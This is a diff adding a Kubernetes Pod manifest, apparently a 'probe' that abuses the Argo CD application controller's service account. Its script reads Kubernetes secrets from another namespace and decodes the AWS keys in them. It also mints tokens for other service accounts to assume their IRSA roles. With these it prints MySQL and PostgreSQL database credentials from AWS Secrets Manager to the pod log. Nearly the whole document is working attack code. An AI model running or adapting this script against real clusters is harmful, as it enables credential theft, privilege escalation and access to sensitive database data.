@@ -1,0 +1,97 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: i2660-probe2
+  namespace: argocd
+  labels:
+    i2660: probe
+spec:
+  serviceAccountName: argocd-application-controller
+  automountServiceAccountToken: true
+  restartPolicy: Never
+  securityContext:
+    runAsNonRoot: true
+    runAsUser: 65534
+    runAsGroup: 65534
+    seccompProfile:
+      type: RuntimeDefault
+  containers:
+    - name: i2660-probe2
+      image: alpine
+      imagePullPolicy: IfNotPresent
+      command: ["/bin/sh","-c"]
+      args:
+        - |
+          set -u
+          SA=/var/run/secrets/kubernetes.io/serviceaccount
+          TOKEN=$(cat $SA/token)
+          API=https://kubernetes.default.svc
+          H="Authorization: Bearer $TOKEN"
+          CT="Content-Type: application/json"
+          get() { wget -q -O - --timeout=25 --no-check-certificate --header="$H" "$1" 2>/dev/null; }
+          post() { wget -q -O - --timeout=25 --no-check-certificate --header="$H" --header="$CT" --post-data="$2" "$1" 2>/dev/null; }
+          echo "===P2_START $(date -u +%FT%TZ)==="
+          echo "--- install packages"
+          apk add --no-cache jq >/tmp/apk1.log 2>&1; echo "apk_jq=$?"
+          apk add --no-cache aws-cli >/tmp/apk2.log 2>&1; echo "apk_awscli=$?"
+          apk add --no-cache mariadb-client >/tmp/apk3.log 2>&1; echo "apk_mysql=$?"
+          apk add --no-cache postgresql-client >/tmp/apk4.log 2>&1 || apk add --no-cache postgresql16-client >/tmp/apk4.log 2>&1 || apk add --no-cache postgresql17-client >/tmp/apk4.log 2>&1; echo "apk_psql=$?"
+          for b in jq aws mysql psql base64; do command -v $b >/dev/null 2>&1 && echo "have $b" || echo "MISSING $b"; done
+          tail -3 /tmp/apk1.log /tmp/apk2.log /tmp/apk3.log /tmp/apk4.log 2>/dev/null
+          J() { if command -v jq >/dev/null 2>&1; then jq -r "$1" 2>/dev/null; else cat >/dev/null; fi; }
+          echo "===STATIC_CREDS==="
+          NSJSON=$(get "$API/api/v1/namespaces/notification-service/secrets/rds-secrets")
+          if command -v jq >/dev/null 2>&1; then
+            ACCESS=$(echo "$NSJSON" | jq -r '.data.ACCESS_KEY' | base64 -d)
+            SECRET=$(echo "$NSJSON" | jq -r '.data.SECRET_KEY' | base64 -d)
+          else
+            ACCESS=$(echo "$NSJSON" | sed -n 's/.*"ACCESS_KEY":"\([^"]*\)".*/\1/p' | base64 -d)
+            SECRET=$(echo "$NSJSON" | sed -n 's/.*"SECRET_KEY":"\([^"]*\)".*/\1/p' | base64 -d)
+          fi
+          echo "STATIC_AK_LEN=${#ACCESS} STATIC_SK_LEN=${#SECRET}"
+          export AWS_ACCESS_KEY_ID="$ACCESS" AWS_SECRET_ACCESS_KEY="$SECRET" AWS_DEFAULT_REGION=us-west-2
+          aws sts get-caller-identity 2>&1 | head -20
+          echo "--- static creds secretsmanager"
+          for S in lazamedical-stage01-usw2-mysql-1-db-secret lazamedical-dp-stage01-usw2-postgresql-db-secret; do
+            echo "==SECRET $S=="
+            aws secretsmanager get-secret-value --secret-id "$S" --region us-west-2 --query SecretString --output text 2>&1 | head -c 2000
+            echo
+          done
+          unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY
+          assume() {
+            NS=$1; SAN=$2
+            ROLE=$(get "$API/api/v1/namespaces/$NS/serviceaccounts/$SAN" | sed -n 's/.*"eks.amazonaws.com\/role-arn":"\([^"]*\)".*/\1/p')
+            echo "==ASSUME $NS/$SAN role=$ROLE=="
+            [ -z "$ROLE" ] && { echo "NO_ROLE"; return 1; }
+            TK=$(post "$API/api/v1/namespaces/$NS/serviceaccounts/$SAN/token" '{"audience":"sts.amazonaws.com","expirationSeconds":3600}')
+            WT=$(echo "$TK" | sed -n 's/.*"token":"\([^"]*\)".*/\1/p')
+            if [ -z "$WT" ]; then echo "TOKEN_REQ_FAIL: $(echo "$TK" | head -c 300)"; return 1; fi
+            RES=$(aws sts assume-role-with-web-identity --role-arn "$ROLE" --role-session-name i2660probe --web-identity-token "$WT" --duration-seconds 900 --region us-west-2 --output json 2>&1)
+            if command -v jq >/dev/null 2>&1 && echo "$RES" | jq -e .Credentials >/dev/null 2>&1; then
+              export AWS_ACCESS_KEY_ID=$(echo "$RES" | jq -r '.Credentials.AccessKeyId')
+              export AWS_SECRET_ACCESS_KEY=$(echo "$RES" | jq -r '.Credentials.SecretAccessKey')
+              export AWS_SESSION_TOKEN=$(echo "$RES" | jq -r '.Credentials.SessionToken')
+              echo "ASSUME_OK"
+            else
+              echo "ASSUME_FAIL: $(echo "$RES" | head -c 400)"; return 1
+            fi
+          }
+          echo "===IRSA_USERMGMT==="
+          assume user-management-service user-management-service-sa && {
+            echo "==SECRET lazamedical-stage01-usw2-mysql-1-db-secret=="
+            aws secretsmanager get-secret-value --secret-id lazamedical-stage01-usw2-mysql-1-db-secret --region us-west-2 --query SecretString --output text 2>&1 | head -c 2000; echo
+          }
+          unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
+          echo "===IRSA_DATAMGMT==="
+          assume data-management data-management-sa && {
+            echo "==SECRET lazamedical-dp-stage01-usw2-postgresql-db-secret=="
+            aws secretsmanager get-secret-value --secret-id lazamedical-dp-stage01-usw2-postgresql-db-secret --region us-west-2 --query SecretString --output text 2>&1 | head -c 2000; echo
+          }
+          echo "===P2_END $(date -u +%FT%TZ)==="
+      resources:
+        requests:
+          cpu: 10m
+          memory: 32Mi
+        limits:
+          cpu: 500m
+          memory: 768Mi
